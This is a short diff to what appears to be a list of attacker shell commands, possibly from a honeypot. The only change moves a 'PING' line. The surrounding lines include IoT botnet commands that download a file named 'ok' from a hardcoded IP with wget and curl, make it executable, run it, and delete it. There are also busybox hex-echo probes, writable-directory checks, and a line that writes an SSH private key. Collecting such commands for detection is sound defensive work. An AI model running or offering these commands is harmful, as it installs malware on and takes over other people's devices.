@@ -42,6 +42,7 @@ cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----
 (cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
 ./ok
 /userfs/bin/wget http://5.182.210.174/ok
+PING
 busybox curl -O http://5.182.210.174/ok
 busybox sh ok
 busybox wget http://5.182.210.174/ok
@@ -55,7 +56,6 @@ rm -rf ok.1
 /ip cloud print
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x42\x58\x4d\x4f\x4f\x51'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x46\x59\x51\x50\x47\x51'
-PING
 cat /proc/cpuinfo
 echo Hi | cat -n
 ifconfig
